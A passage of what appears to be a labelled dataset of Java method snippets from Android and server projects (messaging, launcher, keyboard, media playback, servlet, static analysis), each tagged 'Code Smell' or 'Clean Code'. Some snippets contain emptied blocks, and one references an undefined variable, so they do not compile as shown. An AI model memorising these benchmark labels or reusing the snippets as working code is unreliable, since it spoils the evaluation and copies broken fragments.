      line.linesPathBottomSize=j;
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePaint.setAlpha((int)(255 * line.alpha));
      if (USE_LINES)       canvas.drawLines(line.linesPathBottom,0,line.linesPathBottomSize,line.bottomLinePaint);
 else       canvas.drawPath(line.bottomLinePath,line.bottomLinePaint);
    }
  }
}",1,Code Smell
"public void deleteUserPhoto(TLRPC.InputPhoto photo){
  if (photo == null) {
    TLRPC.TL_photos_updateProfilePhoto req=new TLRPC.TL_photos_updateProfilePhoto();
    req.id=new TLRPC.TL_inputPhotoEmpty();
    TLRPC.User user=getUser(getUserConfig().getClientUserId());
    if (user == null) {
      user=getUserConfig().getCurrentUser();
    }
    if (user == null) {
      return;
    }
    if (user.photo != null) {
      getMessagesStorage().clearUserPhoto(user.id,user.photo.photo_id);
    }
    getNotificationCenter().postNotificationName(NotificationCenter.mainUserInfoChanged);
    getNotificationCenter().postNotificationName(NotificationCenter.updateInterfaces,UPDATE_MASK_ALL);
    getConnectionsManager().sendRequest(req,(response,error) -> {
      if (error == null) {
        AndroidUtilities.runOnUIThread(() -> {
          TLRPC.TL_photos_photo photos_photo=(TLRPC.TL_photos_photo)response;
          TLRPC.User user1=getUser(getUserConfig().getClientUserId());
          if (user1 == null) {
            user1=getUserConfig().getCurrentUser();
            putUser(user1,false);
          }
 else {
            getUserConfig().setCurrentUser(user1);
          }
          if (user1 == null) {
            return;
          }
          ArrayList<TLRPC.User> users=new ArrayList<>();
          users.add(user1);
          getMessagesStorage().putUsersAndChats(users,null,false,true);
          if (photos_photo.photo instanceof TLRPC.TL_photo) {
            user1.photo=new TLRPC.TL_userProfilePhoto();
            user1.photo.has_video=!photos_photo.photo.video_sizes.isEmpty();
            user1.photo.photo_id=photos_photo.photo.id;
            user1.photo.photo_small=FileLoader.getClosestPhotoSizeWithSize(photos_photo.photo.sizes,150).location;
            user1.photo.photo_big=FileLoader.getClosestPhotoSizeWithSize(photos_photo.photo.sizes,800).location;
            user1.photo.dc_id=photos_photo.photo.dc_id;
          }
 else {
            user1.photo=new TLRPC.TL_userProfilePhotoEmpty();
          }
          TLRPC.UserFull userFull=getUserFull(getUserConfig().getClientUserId());
          userFull.profile_photo=photos_photo.photo;
          getMessagesStorage().updateUserInfo(userFull,false);
          getUserConfig().getCurrentUser().photo=user1.photo;
          putUser(user1,false);
          getNotificationCenter().postNotificationName(NotificationCenter.mainUserInfoChanged);
          getNotificationCenter().postNotificationName(NotificationCenter.updateInterfaces,UPDATE_MASK_ALL);
          getNotificationCenter().postNotificationName(NotificationCenter.updateInterfaces,UPDATE_MASK_AVATAR);
          getUserConfig().saveConfig(true);
        }
);
      }
    }
);
  }
 else {
    TLRPC.TL_photos_deletePhotos req=new TLRPC.TL_photos_deletePhotos();
    req.id.add(photo);
    getConnectionsManager().sendRequest(req,(response,error) -> {
    }
);
  }
}",1,Code Smell
"public void convertToMegaGroup(Context context,long chatId,BaseFragment fragment,MessagesStorage.LongCallback convertRunnable){
  convertToMegaGroup(context,chatId,fragment,convertRunnable,null);
}
public void convertToMegaGroup(Context context,long chatId,BaseFragment fragment,MessagesStorage.LongCallback convertRunnable,Runnable errorRunnable){
  TLRPC.TL_messages_migrateChat req=new TLRPC.TL_messages_migrateChat();
  req.chat_id=chatId;
  AlertDialog progressDialog=context != null ? new AlertDialog(context,AlertDialog.ALERT_TYPE_SPINNER) : null;
  int reqId=getConnectionsManager().sendRequest(req,(response,error) -> {
    if (error == null) {
      if (context != null) {
        AndroidUtilities.runOnUIThread(() -> {
          if (!((Activity)context).isFinishing()) {
            try {
              progressDialog.dismiss();
            }
 catch (            Exception e) {
              FileLog.e(e);
            }
          }
        }
);
      }
      TLRPC.Updates updates=(TLRPC.Updates)response;
      processUpdates((TLRPC.Updates)response,false);
      AndroidUtilities.runOnUIThread(() -> {
        if (convertRunnable != null) {
          TLRPC.Chat prevChat=null;
          for (int a=0; a < updates.chats.size(); a++) {
            TLRPC.Chat chat=updates.chats.get(a);
            if (chatId == chat.id) {
              prevChat=chat;
              break;
            }
          }
          if (prevChat != null && prevChat.migrated_to != null) {
            long newChatId=prevChat.migrated_to.channel_id;
            TLRPC.Chat newChat=null;
            for (int a=0; a < updates.chats.size(); a++) {
              TLRPC.Chat chat=updates.chats.get(a);
              if (newChatId == chat.id) {
                newChat=chat;
                break;
              }
            }
            if (newChat != null) {
              convertRunnable.run(newChatId);
            }
          }
        }
      }
);
    }
 else {
      if (errorRunnable != null) {
        errorRunnable.run();
      }
      AndroidUtilities.runOnUIThread(() -> {
        if (convertRunnable != null) {
          convertRunnable.run(0);
        }
        if (context != null) {
          if (!((Activity)context).isFinishing()) {
            try {
              progressDialog.dismiss();
            }
 catch (            Exception e) {
              FileLog.e(e);
            }
            AlertsCreator.processError(currentAccount,error,fragment,req,false);
          }
        }
      }
);
    }
  }
);
  if (progressDialog != null) {
    progressDialog.setOnCancelListener(dialog -> getConnectionsManager().cancelRequest(reqId,true));
    try {
      progressDialog.show();
    }
 catch (    Exception ignore) {
    }
  }
}",1,Code Smell
"@WorkerThread private void loadTrackers(){
  if (mAllClasses == null)   return;
  List<SignatureInfo> trackerInfoList=new ArrayList<>();
  String[] trackerNames=StaticDataset.getTrackerNames();
  String[] trackerSignatures=StaticDataset.getTrackerCodeSignatures();
  int[] signatureCount=new int[trackerSignatures.length];
  mTrackerClasses=new ArrayList<>();
  for (  String className : mAllClasses) {
    if (className.length() > 8 && className.contains(""."")) {
      for (int i=0; i < trackerSignatures.length; i++) {
        if (className.contains(trackerSignatures[i])) {
          mTrackerClasses.add(className);
          signatureCount[i]++;
          break;
        }
      }
    }
  }
  for (int i=0; i < trackerSignatures.length; i++) {
    if (signatureCount[i] == 0)     continue;
    SignatureInfo signatureInfo=new SignatureInfo(trackerSignatures[i],trackerNames[i]);
    signatureInfo.setCount(signatureCount[i]);
    trackerInfoList.add(signatureInfo);
  }
  mTrackerClassesLiveData.postValue(trackerInfoList);
}",1,Code Smell
"/** 
 * @hidden Concatenation operation that understands the endianess of the data. this KSet contains the most significant part, rhs is least significant part
 * @param rhs least significant part
 * @return KSet
 */
public KSet piece(KSet rhs){
  int resBits=bits + rhs.bits;
  long taintRes=getBinaryTaintResult(rhs);
  if (isTop() || rhs.isTop()) {
    return getTop(taintRes);
  }
  KSet res=new KSet(resBits,taintRes);
  if (isBot() || rhs.isBot()) {
    return res;
  }
  for (  AbsVal mostPart : kSet) {
    if (mostPart.region.isGlobal()) {
      for (      AbsVal leastPart : rhs.kSet) {
        if (leastPart.region.isGlobal()) {
          if (resBits <= 64) {
            long tmp=(mostPart.value << rhs.bits) | leastPart.value;
            res.kSet=res.kSet.insert(new AbsVal(Global.getInstance(),tmp));
          }
 else {
            BigInteger bigMostPart=mostPart.toBigInteger(bits,false);
            BigInteger bigLeastPart=leastPart.toBigInteger(rhs.bits,false);
            BigInteger bigTmp=bigMostPart.shiftLeft(rhs.bits).or(bigLeastPart);
            res.kSet=res.kSet.insert(new AbsVal(Global.getInstance(),bigTmp));
          }
        }
      }
    }
  }
  return res;
}",1,Code Smell
"private void updateVisibleRows(int mask){
  updateVisibleRows(mask,true);
}
private void updateVisibleRows(int mask,boolean animated){
  if ((dialogsListFrozen && (mask & MessagesController.UPDATE_MASK_REORDER) == 0) || isPaused) {
    return;
  }
  for (int c=0; c < 3; c++) {
    RecyclerListView list;
    ViewPage viewPage=null;
    if (c == 2) {
      list=searchViewPager != null ? searchViewPager.searchListView : null;
    }
 else     if (viewPages != null) {
      list=c < viewPages.length ? viewPages[c].listView : null;
      if (list != null && viewPages[c].getVisibility() != View.VISIBLE) {
        continue;
      }
      if (list != null) {
        viewPage=viewPages[c];
      }
    }
 else {
      continue;
    }
    if (list == null || list.getAdapter() == null) {
      continue;
    }
    if ((mask & MessagesController.UPDATE_MASK_NEW_MESSAGE) != 0 || mask == 0) {
      if (viewPage != null) {
        viewPage.updateList(false);
        continue;
      }
    }
    int count=list.getChildCount();
    for (int a=0; a < count; a++) {
      View child=list.getChildAt(a);
      if (child instanceof DialogCell) {
        if (list.getAdapter() != searchViewPager.dialogsSearchAdapter) {
          DialogCell cell=(DialogCell)child;
          if ((mask & MessagesController.UPDATE_MASK_REORDER) != 0) {
            cell.onReorderStateChanged(actionBar.isActionModeShowed(),true);
            if (dialogsListFrozen) {
              continue;
            }
          }
          if ((mask & MessagesController.UPDATE_MASK_CHECK) != 0) {
            cell.setChecked(false,(mask & MessagesController.UPDATE_MASK_CHAT) != 0);
          }
 else {
            if ((mask & MessagesController.UPDATE_MASK_SELECT_DIALOG) != 0) {
              if (viewPages[c].isDefaultDialogType() && AndroidUtilities.isTablet()) {
                cell.setDialogSelected(cell.getDialogId() == openedDialogId.dialogId);
              }
            }
 else {
              if (cell.update(mask,animated)) {
                viewPage.updateList(false);
                break;
              }
            }
            if (selectedDialogs != null) {
              cell.setChecked(selectedDialogs.contains(cell.getDialogId()),false);
            }
          }
        }
      }
      if (child instanceof UserCell) {
        ((UserCell)child).update(mask);
      }
 else       if (child instanceof ProfileSearchCell) {
        ProfileSearchCell cell=(ProfileSearchCell)child;
        cell.update(mask);
        if (selectedDialogs != null) {
          cell.setChecked(selectedDialogs.contains(cell.getDialogId()),false);
        }
      }
      if (dialogsListFrozen) {
        continue;
      }
      if (child instanceof RecyclerListView) {
        RecyclerListView innerListView=(RecyclerListView)child;
        int count2=innerListView.getChildCount();
        for (int b=0; b < count2; b++) {
          View child2=innerListView.getChildAt(b);
          if (child2 instanceof HintDialogCell) {
            ((HintDialogCell)child2).update(mask);
          }
        }
      }
    }
  }
}",1,Code Smell
"/** 
 * @hidden
 */
public KSet int_and(KSet rhs){
  if (!isTop() && !rhs.isTop()) {
    assert this.bits == rhs.bits;
  }
  long taintRes=getBinaryTaintResult(rhs);
  if (isTop() || rhs.isTop()) {
    return getTop(taintRes);
  }
  KSet res=new KSet(bits,taintRes);
  for (  AbsVal op1 : kSet) {
    for (    AbsVal op2 : rhs.kSet) {
      RegionBase region=getRegionBinaryLogic(op1,op2);
      if (region != null) {
        if (res.kSet.size() == GlobalState.config.getK()) {
          return getTop(taintRes);
        }
        if (bits <= 64) {
          assert (op1.bigVal == null && op2.bigVal == null);
          res.kSet=res.kSet.insert(new AbsVal(region,(op1.value & op2.value) & getMask(bits)));
        }
 else {
          BigInteger bigOp1=op1.toBigInteger(bits,false);
          BigInteger bigOp2=op2.toBigInteger(bits,false);
          BigInteger tmp=bigOp1.and(bigOp2).and(getBigMask(bits));
          res.kSet=res.kSet.insert(new AbsVal(region,tmp));
        }
      }
    }
  }
  return res;
}",1,Code Smell
"@Override public SearchResult searchMod(SearchFilters searchFilters,SearchResult previousPageResult){
  ModrinthSearchResult modrinthSearchResult=(ModrinthSearchResult)previousPageResult;
  if (modrinthSearchResult != null && modrinthSearchResult.previousOffset >= modrinthSearchResult.totalResultCount) {
    ModrinthSearchResult emptyResult=new ModrinthSearchResult();
    emptyResult.results=new ModItem[0];
    emptyResult.totalResultCount=modrinthSearchResult.totalResultCount;
    emptyResult.previousOffset=modrinthSearchResult.previousOffset;
    return emptyResult;
  }
  HashMap<String,Object> params=new HashMap<>();
  StringBuilder facetString=new StringBuilder();
  facetString.append(""["");
  facetString.append(String.format(""[\""project_type:%s\""]"",searchFilters.isModpack ? ""modpack"" : ""mod""));
  if (searchFilters.mcVersion != null && !searchFilters.mcVersion.isEmpty())   facetString.append(String.format("",[\""versions:%s\""]"",searchFilters.mcVersion));
  facetString.append(""]"");
  params.put(""facets"",facetString.toString());
  params.put(""query"",searchFilters.name);
  params.put(""limit"",50);
  params.put(""index"",""relevance"");
  if (modrinthSearchResult != null)   params.put(""offset"",modrinthSearchResult.previousOffset);
  JsonObject response=mApiHandler.get(""search"",params,JsonObject.class);
  if (response == null)   return null;
  JsonArray responseHits=response.getAsJsonArray(""hits"");
  if (responseHits == null)   return null;
  ModItem[] items=new ModItem[responseHits.size()];
  for (int i=0; i < responseHits.size(); ++i) {
    JsonObject hit=responseHits.get(i).getAsJsonObject();
    items[i]=new ModItem(Constants.SOURCE_MODRINTH,hit.get(""project_type"").getAsString().equals(""modpack""),hit.get(""project_id"").getAsString(),hit.get(""title"").getAsString(),hit.get(""description"").getAsString(),hit.get(""icon_url"").getAsString());
  }
  if (modrinthSearchResult == null)   modrinthSearchResult=new ModrinthSearchResult();
  modrinthSearchResult.previousOffset+=responseHits.size();
  modrinthSearchResult.results=items;
  modrinthSearchResult.totalResultCount=response.get(""total_hits"").getAsInt();
  return modrinthSearchResult;
}",1,Code Smell
"@Test public void testFinal(){
  boolean[][] g=new boolean[DEFAULT_TEST_SIZE][DEFAULT_TEST_SIZE];
  ArrayList<Function> functions=new ArrayList<>();
  for (int i=0; i < DEFAULT_TEST_SIZE; i++) {
    functions.add(Mockito.mock(Function.class));
  }
  for (int i=0; i < DEFAULT_TEST_SIZE; i++) {
    for (int j=0; j < DEFAULT_TEST_SIZE; j++) {
      callGraph.addEdge(functions.get(i),functions.get(j));
      g[i][j]=true;
    }
  }
  for (int i=0; i < 50; i++) {
    int rand=(int)(Math.random() * 10);
    rand=rand % 2;
    int k=(int)(Math.random() * 100);
    k=k % DEFAULT_TEST_SIZE;
    if (rand == 1) {
      callGraph.resetSuccs(functions.get(k));
      for (int j=0; j < DEFAULT_TEST_SIZE; j++) {
        g[k][j]=false;
      }
    }
 else {
      callGraph.resetPreds(functions.get(k));
      for (int j=0; j < DEFAULT_TEST_SIZE; j++) {
        g[j][k]=false;
      }
    }
  }
  for (int i=1; i <= 100; i++) {
    int u=(int)(Math.random() * 100);
    int v=(int)(Math.random() * 100);
    u%=DEFAULT_TEST_SIZE;
    v%=DEFAULT_TEST_SIZE;
    int opt=(int)(Math.random() * 100);
    opt%=2;
    if (opt == 1) {
      callGraph.addEdge(functions.get(u),functions.get(v));
      g[u][v]=true;
    }
 else {
      callGraph.deleteEdge(functions.get(u),functions.get(v));
      g[u][v]=false;
    }
  }
  floyd(g);
  for (int i=0; i < DEFAULT_TEST_SIZE; i++) {
    for (int j=0; j < DEFAULT_TEST_SIZE; j++) {
      assertEquals(g[i][j],callGraph.hasPath(functions.get(i),functions.get(j)));
      System.out.println(i + "" -> "" + j+ "" exp:""+ g[i][j]+ "" act:""+ callGraph.hasPath(functions.get(i),functions.get(j)));
    }
  }
}",1,Code Smell
"/** 
 * Initialize the service, including the service object.
 */
public void init(ServletConfig config) throws ServletException {
  super.init(config);
  try {
    if (_homeImpl != null) {
    }
 else     if (getInitParameter(""home-class"") != null) {
      String className=getInitParameter(""home-class"");
      Class<?> homeClass=loadClass(className);
      _homeImpl=homeClass.newInstance();
      init(_homeImpl);
    }
 else     if (getInitParameter(""service-class"") != null) {
      String className=getInitParameter(""service-class"");
      Class<?> homeClass=loadClass(className);
      _homeImpl=homeClass.newInstance();
      init(_homeImpl);
    }
 else {
      if (getClass().equals(HessianServlet.class))       throw new ServletException(""server must extend HessianServlet"");
      _homeImpl=this;
    }
    if (_homeAPI != null) {
    }
 else     if (getInitParameter(""home-api"") != null) {
      String className=getInitParameter(""home-api"");
      _homeAPI=loadClass(className);
    }
 else     if (getInitParameter(""api-class"") != null) {
      String className=getInitParameter(""api-class"");
      _homeAPI=loadClass(className);
    }
 else     if (_homeImpl != null) {
      _homeAPI=findRemoteAPI(_homeImpl.getClass());
      if (_homeAPI == null)       _homeAPI=_homeImpl.getClass();
      _homeAPI=_homeImpl.getClass();
    }
    if (_objectImpl != null) {
    }
 else     if (getInitParameter(""object-class"") != null) {
      String className=getInitParameter(""object-class"");
      Class<?> objectClass=loadClass(className);
      _objectImpl=objectClass.newInstance();
      init(_objectImpl);
    }
    if (_objectAPI != null) {
    }
 else     if (getInitParameter(""object-api"") != null) {
      String className=getInitParameter(""object-api"");
      _objectAPI=loadClass(className);
    }
 else     if (_objectImpl != null)     _objectAPI=_objectImpl.getClass();
    _homeSkeleton=new HessianSkeleton(_homeImpl,_homeAPI);
    if (_objectAPI != null)     _homeSkeleton.setObjectClass(_objectAPI);
    if (_objectImpl != null) {
      _objectSkeleton=new HessianSkeleton(_objectImpl,_objectAPI);
      _objectSkeleton.setHomeClass(_homeAPI);
    }
 else     _objectSkeleton=_homeSkeleton;
    if (""true"".equals(getInitParameter(""debug""))) {
    }
    if (""false"".equals(getInitParameter(""send-collection-type"")))     setSendCollectionType(false);
  }
 catch (  ServletException e) {
    throw e;
  }
catch (  Exception e) {
    throw new ServletException(e);
  }
}
private void init(Object service) throws ServletException {
  if (!this.getClass().equals(HessianServlet.class)) {
  }
 else   if (service instanceof Service)   ((Service)service).init(getServletConfig());
 else   if (service instanceof Servlet)   ((Servlet)service).init(getServletConfig());
}
",1,Code Smell
"public synchronized void removeItem(Context context,ItemInfo... items){
  removeItem(context,Arrays.asList(items));
}
public synchronized void removeItem(Context context,Iterable<? extends ItemInfo> items){
  ArraySet<UserHandle> updatedDeepShortcuts=new ArraySet<>();
  for (  ItemInfo item : items) {
switch (item.itemType) {
case LauncherSettings.Favorites.ITEM_TYPE_FOLDER:
case LauncherSettings.Favorites.ITEM_TYPE_APP_PAIR:
      folders.remove(item.id);
    if (FeatureFlags.IS_STUDIO_BUILD) {
      for (      ItemInfo info : itemsIdMap) {
        if (info.container == item.id) {
          String msg=""deleting a collection ("" + item + "") which still ""+ ""contains items (""+ info+ "")"";
          Log.e(TAG,msg);
        }
      }
    }
  workspaceItems.remove(item);
break;
case LauncherSettings.Favorites.ITEM_TYPE_DEEP_SHORTCUT:
{
updatedDeepShortcuts.add(item.user);
}
case LauncherSettings.Favorites.ITEM_TYPE_APPLICATION:
workspaceItems.remove(item);
break;
case LauncherSettings.Favorites.ITEM_TYPE_APPWIDGET:
case LauncherSettings.Favorites.ITEM_TYPE_CUSTOM_APPWIDGET:
appWidgets.remove(item);
break;
}
itemsIdMap.remove(item.id);
}
updatedDeepShortcuts.forEach(user -> updateShortcutPinnedState(context,user));
}
",1,Code Smell
"public static Class<?> getJavaClass(String type){
  int index=type.indexOf(""[]"");
  if (index == -1) {
    return getJavaClassInner(type);
  }
  StringBuilder arrayString=new StringBuilder(""["");
  String baseType=type.substring(0,index);
  while ((index=type.indexOf(""[]"",index + 2)) >= 0) {
    arrayString.append(""["");
  }
  Class<?> baseClass=getJavaClassInner(baseType);
  try {
    String baseName="""";
    if (!baseClass.isPrimitive()) {
      return loadClass(arrayString + ""L"" + baseClass.getName()+ "";"");
    }
    if (baseClass.equals(boolean.class)) {
      baseName=""Z"";
    }
 else     if (baseClass.equals(byte.class)) {
      baseName=""B"";
    }
 else     if (baseClass.equals(char.class)) {
      baseName=""C"";
    }
 else     if (baseClass.equals(double.class)) {
      baseName=""D"";
    }
 else     if (baseClass.equals(float.class)) {
      baseName=""F"";
    }
 else     if (baseClass.equals(int.class)) {
      baseName=""I"";
    }
 else     if (baseClass.equals(long.class)) {
      baseName=""J"";
    }
 else     if (baseClass.equals(short.class)) {
      baseName=""S"";
    }
    return loadClass(arrayString + baseName);
  }
 catch (  Exception ex) {
    throw new RuntimeException(ex);
  }
}",0,Clean Code
"/** 
 * Reverts a previous commit with auto-correction. <p> This is triggered upon pressing backspace just after a commit with auto-correction.
 * @param inputTransaction The transaction in progress.
 */
private void revertCommit(final InputTransaction inputTransaction){
  final CharSequence originallyTypedWord=mLastComposedWord.mTypedWord;
  final CharSequence committedWord=mLastComposedWord.mCommittedWord;
  final String committedWordString=committedWord.toString();
  final int cancelLength=committedWord.length();
  final String separatorString=mLastComposedWord.mSeparatorString;
  final boolean usePhantomSpace=separatorString.equals(Constants.STRING_SPACE);
  final int separatorLength=separatorString.length();
  final int deleteLength=cancelLength + separatorLength;
  if (DebugFlags.DEBUG_ENABLED) {
    if (mWordComposer.isComposingWord()) {
      throw new RuntimeException(""revertCommit, but we are composing a word"");
    }
    final CharSequence wordBeforeCursor=mConnection.getTextBeforeCursor(deleteLength,0).subSequence(0,cancelLength);
    if (!TextUtils.equals(committedWord,wordBeforeCursor)) {
      throw new RuntimeException(""revertCommit check failed: we thought we were "" + ""reverting \"""" + committedWord + ""\"", but before the cursor we found \""""+ wordBeforeCursor+ ""\"""");
    }
  }
  mConnection.deleteTextBeforeCursor(deleteLength);
  if (!TextUtils.isEmpty(committedWord)) {
    unlearnWord(committedWordString,inputTransaction.getMSettingsValues(),Constants.EVENT_REVERT);
  }
  final String stringToCommit=originallyTypedWord + (usePhantomSpace ? """" : separatorString);
  final SpannableString textToCommit=new SpannableString(stringToCommit);
  if (committedWord instanceof SpannableString) {
    final SpannableString committedWordWithSuggestionSpans=(SpannableString)committedWord;
    final Object[] spans=committedWordWithSuggestionSpans.getSpans(0,committedWord.length(),Object.class);
    final int lastCharIndex=textToCommit.length() - 1;
    final ArrayList<String> suggestions=new ArrayList<>();
    suggestions.add(committedWordString);
    for (    final Object span : spans) {
      if (span instanceof SuggestionSpan) {
        for (        final String suggestion : suggestionSpan.getSuggestions()) {
          if (!suggestion.equals(committedWordString)) {
            suggestions.add(suggestion);
          }
        }
      }
 else {
        textToCommit.setSpan(span,0,lastCharIndex,committedWordWithSuggestionSpans.getSpanFlags(span));
      }
    }
    textToCommit.setSpan(new SuggestionSpan(mLatinIME,inputTransaction.getMSettingsValues().mLocale,suggestions.toArray(new String[0]),0,null),0,lastCharIndex,0);
  }
  if (inputTransaction.getMSettingsValues().mSpacingAndPunctuations.mCurrentLanguageHasSpaces) {
    mConnection.commitText(textToCommit,1);
    if (usePhantomSpace) {
      mJustRevertedACommit=true;
      mSpaceState=SpaceState.PHANTOM;
    }
  }
 else {
    final int[] codePoints=StringUtils.toCodePointArray(stringToCommit);
    mWordComposer.setComposingWord(codePoints,mLatinIME.getCoordinatesForCurrentKeyboard(codePoints));
    setComposingTextInternal(textToCommit,1);
  }
  mLastComposedWord=LastComposedWord.NOT_A_COMPOSED_WORD;
  inputTransaction.setRequiresUpdateSuggestions();
}",1,Code Smell
"private JavaType genericType(GenericsType g,String signature){
  if (!g.isPlaceholder() && !g.isWildcard()) {
    return type(g.getType());
  }
  JavaType.GenericTypeVariable.Variance variance=INVARIANT;
  JavaType.GenericTypeVariable gtv=new JavaType.GenericTypeVariable(null,g.getName(),variance,null);
  typeCache.put(signature,gtv);
  List<JavaType> bounds=null;
  if (g.getUpperBounds() != null) {
    for (    ClassNode bound : g.getUpperBounds()) {
      JavaType.FullyQualified mappedBound=TypeUtils.asFullyQualified(type(bound));
      if (mappedBound != null && !""java.lang.Object"".equals(mappedBound.getFullyQualifiedName())) {
        if (bounds == null) {
          bounds=new ArrayList<>(g.getUpperBounds().length);
        }
        bounds.add(mappedBound);
        variance=COVARIANT;
      }
    }
  }
 else   if (g.getLowerBound() != null) {
    JavaType.FullyQualified mappedBound=TypeUtils.asFullyQualified(type(g.getLowerBound()));
    if (mappedBound != null && !""java.lang.Object"".equals(mappedBound.getFullyQualifiedName())) {
      bounds=singletonList(mappedBound);
      variance=CONTRAVARIANT;
    }
  }
  gtv.unsafeSet(gtv.getName(),variance,bounds);
  return gtv;
}
",1,Code Smell
"@Override public void render(long positionUs,long elapsedRealtimeUs) throws ExoPlaybackException {
  if (outputStreamEnded) {
    return;
  }
  if (nextSubtitle == null) {
    decoder.setPositionUs(positionUs);
    try {
      nextSubtitle=decoder.dequeueOutputBuffer();
    }
 catch (    SubtitleDecoderException e) {
      throw ExoPlaybackException.createForRenderer(e,getIndex());
    }
  }
  if (getState() != STATE_STARTED) {
    return;
  }
  boolean textRendererNeedsUpdate=false;
  if (subtitle != null) {
    long subtitleNextEventTimeUs=getNextEventTime();
    while (subtitleNextEventTimeUs <= positionUs) {
      nextSubtitleEventIndex++;
      subtitleNextEventTimeUs=getNextEventTime();
      textRendererNeedsUpdate=true;
    }
  }
  if (nextSubtitle != null) {
    if (nextSubtitle.isEndOfStream()) {
      if (!textRendererNeedsUpdate && getNextEventTime() == Long.MAX_VALUE) {
        if (decoderReplacementState == REPLACEMENT_STATE_WAIT_END_OF_STREAM) {
          replaceDecoder();
        }
 else {
          releaseBuffers();
          outputStreamEnded=true;
        }
      }
    }
 else     if (nextSubtitle.timeUs <= positionUs) {
      if (subtitle != null) {
        subtitle.release();
      }
      subtitle=nextSubtitle;
      nextSubtitle=null;
      nextSubtitleEventIndex=subtitle.getNextEventTimeIndex(positionUs);
      textRendererNeedsUpdate=true;
    }
  }
  if (textRendererNeedsUpdate) {
    updateOutput(subtitle.getCues(positionUs));
  }
  if (decoderReplacementState == REPLACEMENT_STATE_WAIT_END_OF_STREAM) {
    return;
  }
  try {
    while (!inputStreamEnded) {
      if (nextInputBuffer == null) {
        nextInputBuffer=decoder.dequeueInputBuffer();
        if (nextInputBuffer == null) {
          return;
        }
      }
      if (decoderReplacementState == REPLACEMENT_STATE_SIGNAL_END_OF_STREAM) {
        nextInputBuffer.setFlags(C.BUFFER_FLAG_END_OF_STREAM);
        decoder.queueInputBuffer(nextInputBuffer);
        nextInputBuffer=null;
        decoderReplacementState=REPLACEMENT_STATE_WAIT_END_OF_STREAM;
        return;
      }
      int result=readSource(formatHolder,nextInputBuffer,false);
      if (result == C.RESULT_BUFFER_READ) {
        if (nextInputBuffer.isEndOfStream()) {
          inputStreamEnded=true;
        }
 else {
          nextInputBuffer.subsampleOffsetUs=formatHolder.format.subsampleOffsetUs;
          nextInputBuffer.flip();
        }
        decoder.queueInputBuffer(nextInputBuffer);
        nextInputBuffer=null;
      }
 else       if (result == C.RESULT_NOTHING_READ) {
        return;
      }
    }
  }
 catch (  SubtitleDecoderException e) {
    throw ExoPlaybackException.createForRenderer(e,getIndex());
  }
}
",1,Code Smell
"private void updateCurrentUserAndChat(){
  if (currentMessageObject == null) {
    return;
  }
  MessagesController messagesController=MessagesController.getInstance(currentAccount);
  TLRPC.MessageFwdHeader fwd_from=currentMessageObject.messageOwner.fwd_from;
  long currentUserId=UserConfig.getInstance(currentAccount).getClientUserId();
  if (fwd_from != null && fwd_from.from_id instanceof TLRPC.TL_peerChannel && currentMessageObject.getDialogId() == currentUserId) {
    currentChat=MessagesController.getInstance(currentAccount).getChat(fwd_from.from_id.channel_id);
  }
 else   if (fwd_from != null && fwd_from.saved_from_peer != null) {
    if (fwd_from.saved_from_peer.user_id != 0) {
      if (fwd_from.from_id instanceof TLRPC.TL_peerUser) {
        currentUser=messagesController.getUser(fwd_from.from_id.user_id);
      }
 else {
        currentUser=messagesController.getUser(fwd_from.saved_from_peer.user_id);
      }
    }
 else     if (fwd_from.saved_from_peer.channel_id != 0) {
      if (currentMessageObject.isSavedFromMegagroup() && fwd_from.from_id instanceof TLRPC.TL_peerUser) {
        currentUser=messagesController.getUser(fwd_from.from_id.user_id);
      }
 else {
        currentChat=messagesController.getChat(fwd_from.saved_from_peer.channel_id);
      }
    }
 else     if (fwd_from.saved_from_peer.chat_id != 0) {
      if (fwd_from.from_id instanceof TLRPC.TL_peerUser) {
        currentUser=messagesController.getUser(fwd_from.from_id.user_id);
      }
 else {
        currentChat=messagesController.getChat(fwd_from.saved_from_peer.chat_id);
      }
    }
  }
 else   if (fwd_from != null && fwd_from.from_id instanceof TLRPC.TL_peerUser && (fwd_from.imported || currentMessageObject.getDialogId() == currentUserId)) {
    currentUser=messagesController.getUser(fwd_from.from_id.user_id);
  }
 else   if (fwd_from != null && !TextUtils.isEmpty(fwd_from.from_name) && (fwd_from.imported || currentMessageObject.getDialogId() == currentUserId)) {
    currentUser=new TLRPC.TL_user();
    currentUser.first_name=fwd_from.from_name;
  }
 else {
    long fromId=currentMessageObject.getFromChatId();
    if (DialogObject.isUserDialog(fromId) && !currentMessageObject.messageOwner.post) {
      currentUser=messagesController.getUser(fromId);
    }
 else     if (DialogObject.isChatDialog(fromId)) {
      currentChat=messagesController.getChat(-fromId);
    }
 else     if (currentMessageObject.messageOwner.post) {
      currentChat=messagesController.getChat(currentMessageObject.messageOwner.peer_id.channel_id);
    }
  }
  if (currentMessageObject != null && currentMessageObject.getChatId() != 0 && currentMessageObject.messageOwner != null && currentMessageObject.replyMessageObject != null && currentMessageObject.replyMessageObject.isFromUser()) {
    currentReplyUserId=currentMessageObject.replyMessageObject.messageOwner.from_id.user_id;
  }
 else {
    currentReplyUserId=0;
  }
}",1,Code Smell
"@Override public void emitRecord(SourceRecord element,SourceOutput<T> output,MySqlSplitState splitState) throws Exception {
  if (isWatermarkEvent(element)) {
    BinlogOffset watermark=getWatermark(element);
    if (isHighWatermarkEvent(element) && splitState.isSnapshotSplitState()) {
      splitState.asSnapshotSplitState().setHighWatermark(watermark);
    }
  }
 else   if (isSchemaChangeEvent(element) && splitState.isBinlogSplitState()) {
    updateSnapshotRecord(element,splitState);
    HistoryRecord historyRecord=getHistoryRecord(element);
    Array tableChanges=historyRecord.document().getArray(HistoryRecord.Fields.TABLE_CHANGES);
    TableChanges changes=TABLE_CHANGE_SERIALIZER.deserialize(tableChanges,true);
    for (    TableChange tableChange : changes) {
      splitState.asBinlogSplitState().recordSchema(tableChange.getId(),tableChange);
      if (includeSchemaChanges) {
        TableChange newTableChange=ColumnFilterUtil.createTableChange(tableChange,columnNameFilter);
        if (ghostDdlChange) {
          updateGhostDdlElement(element,splitState,historyRecord,ghostTableRegex);
        }
        outputDdlElement(element,output,splitState,newTableChange);
      }
    }
    if (includeSchemaChanges && tableChanges.isEmpty()) {
      TableId tableId=RecordUtils.getTableId(element);
      if (splitState.getMySQLSplit().getTableSchemas().containsKey(tableId) || shouldOutputRenameDdl(historyRecord,tableId)) {
        outputDdlElement(element,output,splitState,null);
      }
      if (ghostDdlChange) {
        collectGhostDdl(element,splitState,historyRecord,ghostTableRegex);
      }
    }
  }
 else   if (isDataChangeRecord(element)) {
    if (splitState.isBinlogSplitState()) {
      BinlogOffset position=getBinlogPosition(element);
